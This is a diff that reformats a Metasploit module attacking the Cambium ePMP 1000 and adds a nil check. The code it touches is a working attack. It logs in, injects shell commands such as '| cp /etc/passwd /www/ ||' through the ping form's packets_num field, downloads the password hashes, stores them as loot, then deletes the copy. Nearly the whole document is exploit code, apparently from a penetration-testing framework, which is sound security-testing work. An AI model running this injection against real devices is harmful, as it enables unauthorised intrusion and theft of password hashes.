@@ -94,13 +94,19 @@ class MetasploitModule < Msf::Auxiliary
       return false
     end
 
-    if (res && res.code == 200 && res.headers['Server'] && (res.headers['Server'].include?('Cambium HTTP Server') || res.body.include?('cambiumnetworks.com')))
+    good_response = (
+      res &&
+      res.code == 200 &&
+      res.headers['Server'] &&
+      (res.headers['Server'].include?('Cambium HTTP Server') || res.body.include?('cambiumnetworks.com'))
+    )
 
+    if good_response
       get_epmp_ver = res.body.match(/"sw_version">([^<]*)/)
       epmp_ver = get_epmp_ver[1]
       print_good("#{rhost}:#{rport} - Running Cambium ePMP 1000 version #{epmp_ver}...")
 
-      if ("#{epmp_ver}" >= '2.5')
+      if "#{epmp_ver}" >= '2.5'
         print_error('This ePMP version is not vulnerable. Module will not continue.')
         return false
       else
@@ -121,9 +127,12 @@ class MetasploitModule < Msf::Auxiliary
     begin
       res = send_request_cgi(
         {
-          'uri'       => '/cgi-bin/luci',
-          'method'    => 'POST',
-          'headers'   => { 'X-Requested-With' => 'XMLHttpRequest', 'Accept' => 'application/json, text/javascript, */*; q=0.01' },
+          'uri' => '/cgi-bin/luci',
+          'method' => 'POST',
+          'headers' => {
+            'X-Requested-With' => 'XMLHttpRequest',
+            'Accept' => 'application/json, text/javascript, */*; q=0.01'
+          },
           'vars_post' =>
             {
               'username' => 'dashboard',
@@ -132,17 +141,28 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
 
-      if (res && res.code == 200 && res.headers.include?('Set-Cookie') && res.headers['Set-Cookie'].include?('sysauth'))
+      good_response = (
+        res &&
+        res.code == 200 &&
+        res.headers.include?('Set-Cookie') &&
+        res.headers['Set-Cookie'].include?('sysauth')
+      )
+
+      if good_response
         sysauth_value = res.headers['Set-Cookie'].match(/((.*)[$ ])/)
 
         cookie1 = "#{sysauth_value}; " + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D"
 
         res = send_request_cgi(
           {
-            'uri'       => '/cgi-bin/luci',
-            'method'    => 'POST',
-            'cookie'    => cookie1,
-            'headers'   => { 'X-Requested-With' => 'XMLHttpRequest', 'Accept' => 'application/json, text/javascript, */*; q=0.01', 'Connection' => 'close' },
+            'uri' => '/cgi-bin/luci',
+            'method' => 'POST',
+            'cookie' => cookie1,
+            'headers' => {
+              'X-Requested-With' => 'XMLHttpRequest',
+              'Accept' => 'application/json, text/javascript, */*; q=0.01',
+              'Connection' => 'close'
+            },
             'vars_post' =>
               {
                 'username' => user,
@@ -153,7 +173,14 @@ class MetasploitModule < Msf::Auxiliary
 
       end
 
-      if (res && res.code == 200 && res.headers.include?('Set-Cookie') && res.headers['Set-Cookie'].include?('stok='))
+      good_response = (
+        res &&
+        res.code == 200 &&
+        res.headers.include?('Set-Cookie') &&
+        res.headers['Set-Cookie'].include?('stok=')
+      )
+
+      if good_response
         print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
 
         report_cred(
@@ -165,83 +192,120 @@ class MetasploitModule < Msf::Auxiliary
         )
 
         get_stok = res.headers['Set-Cookie'].match(/stok=(.*)/)
-        stok_value = get_stok[1]
-        sysauth_value = res.headers['Set-Cookie'].match(/((.*)[$ ])/)
+        if !get_stok.nil?
+          stok_value = get_stok[1]
+          sysauth_value = res.headers['Set-Cookie'].match(/((.*)[$ ])/)
 
-        cookie2 = "#{sysauth_value}; " + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D; userType=Installer; usernameType=installer; stok=" + "#{stok_value}"
+          cookie2 = "#{sysauth_value}; " + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D; userType=Installer; usernameType=installer; stok=" + "#{stok_value}"
 
-        uri1 = '/cgi-bin/luci/;stok=' + "#{stok_value}" + '/admin/ping'
-        command = 'cp /etc/passwd /www/'
-        inject = '|' + "#{command}" + ' ||'
-        clean_inject = CGI.unescapeHTML(inject.to_s)
+          uri1 = '/cgi-bin/luci/;stok=' + "#{stok_value}" + '/admin/ping'
+          command = 'cp /etc/passwd /www/'
+          inject = '|' + "#{command}" + ' ||'
+          clean_inject = CGI.unescapeHTML(inject.to_s)
 
-        res = send_request_cgi(
-          {
-            'uri' => uri1,
-            'method' => 'POST',
-            'cookie' => cookie2,
-            'headers' => { 'Accept' => '*/*', 'Accept-Language' => 'en-US,en;q=0.5', 'Accept-Encoding' => 'gzip, deflate', 'X-Requested-With' => 'XMLHttpRequest', 'ctype' => '*/*', 'Connection' => 'close' },
-            'vars_post' =>
-              {
-                'ping_ip' => '8.8.8.8',
-                'packets_num' => clean_inject,
-                'buf_size' => 0,
-                'ttl' => 1,
-                'debug' => '0'
+          res = send_request_cgi(
+            {
+              'uri' => uri1,
+              'method' => 'POST',
+              'cookie' => cookie2,
+              'headers' => {
+                'Accept' => '*/*',
+                'Accept-Language' => 'en-US,en;q=0.5',
+                'Accept-Encoding' => 'gzip, deflate',
+                'X-Requested-With' => 'XMLHttpRequest',
+                'ctype' => '*/*',
+                'Connection' => 'close'
+              },
+              'vars_post' =>
+                {
+                  'ping_ip' => '8.8.8.8',
+                  'packets_num' => clean_inject,
+                  'buf_size' => 0,
+                  'ttl' => 1,
+                  'debug' => '0'
+                }
+            }
+          )
+
+          res = send_request_cgi(
+            {
+              'method' => 'GET',
+              'uri' => '/passwd',
+              'cookie' => cookie2,
+              'headers' => {
+                'Accept' => '*/*',
+                'Accept-Language' => 'en-US,en;q=0.5',
+                'Accept-Encoding' => 'gzip, deflate',
+                'X-Requested-With' => 'XMLHttpRequest',
+                'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Connection' => 'close'
               }
-          }
-        )
+            }, 25
+          )
 
-        res = send_request_cgi({ 'method' => 'GET', 'uri' => '/passwd', 'cookie' => cookie2, 'headers' => { 'Accept' => '*/*', 'Accept-Language' => 'en-US,en;q=0.5', 'Accept-Encoding' => 'gzip, deflate', 'X-Requested-With' => 'XMLHttpRequest', 'ctype' => 'application/x-www-form-urlencoded; charset=UTF-8', 'Connection' => 'close' } }, 25)
+          if res && res.code == 200 && res.body =~ /root/
+            vprint_status('++++++++++++++++++++++++++++++++++++++')
+            vprint_status("#{rhost}:#{rport} - dumping password hashes")
+            vprint_line("#{res.body}")
+            vprint_status('++++++++++++++++++++++++++++++++++++++')
 
-        if res && res.code == 200 && res.body =~ /root/
-          vprint_status('++++++++++++++++++++++++++++++++++++++')
-          vprint_status("#{rhost}:#{rport} - dumping password hashes")
-          vprint_line("#{res.body}")
-          vprint_status('++++++++++++++++++++++++++++++++++++++')
+            print_good("#{rhost}:#{rport} - File retrieved successfully!")
+            path = store_loot('ePMP_passwd', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 password hashes')
+            print_status("#{rhost}:#{rport} - File saved in: #{path}")
+          else
+            print_error("#{rhost}:#{rport} - Failed to retrieve hashes")
+            return
+          end
 
-          print_good("#{rhost}:#{rport} - File retrieved successfully!")
-          path = store_loot('ePMP_passwd', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 password hashes')
-          print_status("#{rhost}:#{rport} - File saved in: #{path}")
+          command = 'rm /www/passwd'
+          inject = '|' + "#{command}" + ' ||'
+          clean_inject = CGI.unescapeHTML(inject.to_s)
+
+          res = send_request_cgi(
+            {
+              'uri' => uri1,
+              'method' => 'POST',
+              'cookie' => cookie2,
+              'headers' => {
+                'Accept' => '*/*',
+                'Accept-Language' => 'en-US,en;q=0.5',
+                'Accept-Encoding' => 'gzip, deflate',
+                'X-Requested-With' => 'XMLHttpRequest',
+                'ctype' => '*/*',
+                'Connection' => 'close'
+              },
+              'vars_post' =>
+                {
+                  'ping_ip' => '8.8.8.8',
+                  'packets_num' => clean_inject,
+                  'buf_size' => 0,
+                  'ttl' => 1,
+                  'debug' => '0'
+                }
+            }
+          )
+
+          # Extract ePMP version
+          res = send_request_cgi(
+            {
+              'uri' => '/',
+              'method' => 'GET'
+            }
+          )
+
+          epmp_ver = res.body.match(/"sw_version">([^<]*)/)[1]
+
+          report_cred(
+            ip: rhost,
+            port: rport,
+            service_name: "Cambium ePMP 1000 v#{epmp_ver}",
+            user: user,
+            password: pass
+          )
         else
-          print_error("#{rhost}:#{rport} - Failed to retrieve hashes")
-          return
+          # Login failed
+          print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
         end
-
-        command = 'rm /www/passwd'
-        inject = '|' + "#{command}" + ' ||'
-        clean_inject = CGI.unescapeHTML(inject.to_s)
-
-        res = send_request_cgi(
-          {
-            'uri'       => uri1,
-            'method'    => 'POST',
-            'cookie'    => cookie2,
-            'headers'   => { 'Accept' => '*/*', 'Accept-Language' => 'en-US,en;q=0.5', 'Accept-Encoding' => 'gzip, deflate', 'X-Requested-With' => 'XMLHttpRequest', 'ctype' => '*/*', 'Connection' => 'close' },
-            'vars_post' => { 'ping_ip' => '8.8.8.8', 'packets_num' => clean_inject, 'buf_size' => 0, 'ttl' => 1, 'debug' => '0' }
-          }
-        )
-
-        # Extract ePMP version
-        res = send_request_cgi(
-          {
-            'uri' => '/',
-            'method' => 'GET'
-          }
-        )
-
-        epmp_ver = res.body.match(/"sw_version">([^<]*)/)[1]
-
-        report_cred(
-          ip: rhost,
-          port: rport,
-          service_name: "Cambium ePMP 1000 v#{epmp_ver}",
-          user: user,
-          password: pass
-        )
-      else
-        # Login failed
-        print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
       end
     end
   end
